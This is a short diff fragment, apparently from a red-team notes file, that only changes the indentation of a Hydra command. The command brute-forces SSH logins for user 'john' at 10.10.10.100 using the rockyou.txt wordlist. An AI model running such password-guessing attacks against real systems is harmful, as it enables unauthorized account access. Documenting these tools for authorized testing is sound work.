@@ -405,7 +405,7 @@ hydra -l $USERNAME -P $WORDLIST $SERVER $SERVICE
 #
 hydra -l john \
       -P ~/.local/share/red-team/wordlists/rockyou.txt \
-        10.10.10.100 ssh
+         10.10.10.100 ssh
 ```
 
 Additional Hydra options:
